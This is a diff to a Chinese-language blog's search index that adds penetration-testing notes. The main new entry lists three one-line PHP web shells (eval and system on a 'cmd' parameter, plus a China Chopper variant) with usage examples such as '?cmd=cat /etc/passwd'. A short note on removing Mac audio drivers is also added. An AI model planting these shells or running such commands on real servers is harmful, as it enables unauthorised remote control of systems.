@@ -26569,7 +26569,8 @@
 <li><p>右键创建好的shell，进行渗透操作</p>
 </li>
 </ul>
-<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
+<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.bilibili.com/video/BV1E4411L7zS" target="_blank" rel="noopener">哔哩哔哩——程序学习</a></p>
+]]></content>
       <categories>
         <category>Penetration Tests</category>
       </categories>
@@ -26816,6 +26817,63 @@
 <h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
       <categories>
         <category>Java</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>【笔记】上传Webshell木马脚本</title>
+    <url>/2020/10/19/%E4%B8%8A%E4%BC%A0Webshell%E6%9C%A8%E9%A9%AC%E8%84%9A%E6%9C%AC/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上传Webshell木马脚本进行渗透测试</p>
+<p><font color="red">本文仅用于网络信息防御学习</font></p>
+<a id="more"></a>
+
+<h2 id="php权限马"><a href="#php权限马" class="headerlink" title="php权限马"></a>php权限马</h2><ul>
+<li>创建<code>.php</code>文件</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_REQUEST[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><ul>
+<li>原理：可以将变量cmd赋值，但是只能赋值php代码</li>
+<li>地址栏访问时追加参数<code>?cmd=phpinfo()</code></li>
+</ul>
+<h2 id="shell权限马"><a href="#shell权限马" class="headerlink" title="shell权限马"></a>shell权限马</h2><ul>
+<li>创建<code>.php</code>文件</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system($_REQUEST[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h3><ul>
+<li>原理：可以将变量cmd赋值，但是只能赋值shell代码</li>
+<li>地址栏访问时追加参数<code>?cmd=cat /etc/passwd</code></li>
+</ul>
+<h2 id="中国菜刀马"><a href="#中国菜刀马" class="headerlink" title="中国菜刀马"></a>中国菜刀马</h2><blockquote>
+<p><code>cmd</code>：作为使用中国菜刀时的密码</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>配合中国菜刀进行渗透</li>
+</ul>
+<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.bilibili.com/video/BV1E4411L7zS" target="_blank" rel="noopener">哔哩哔哩——程序学习</a></p>
+]]></content>
+      <categories>
+        <category>Penetration Tests</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>【笔记】删除Mac多余音频驱动</title>
+    <url>/2020/10/19/%E5%88%A0%E9%99%A4Mac%E5%A4%9A%E4%BD%99%E9%9F%B3%E9%A2%91%E9%A9%B1%E5%8A%A8/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>删除Mac多余音频驱动</p>
+<a id="more"></a>
+
+<h2 id="删除驱动"><a href="#删除驱动" class="headerlink" title="删除驱动"></a>删除驱动</h2><ul>
+<li>在以下目录删除对应名称的音频驱动，并重启电脑</li>
+</ul>
+<blockquote>
+<p><code>/Library/Extensions/</code><br><code>/System/Library/Extensions/</code><br><code>/Library/Audio/Plug-Ins/HAL/</code></p>
+</blockquote>
+<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="http://www.jouypub.com/2019/931064f5e92818407afdee54bcaa57cc/" target="_blank" rel="noopener">JouyPub的博客</a></p>
+]]></content>
+      <categories>
+        <category>MacOS</category>
       </categories>
   </entry>
 </search>
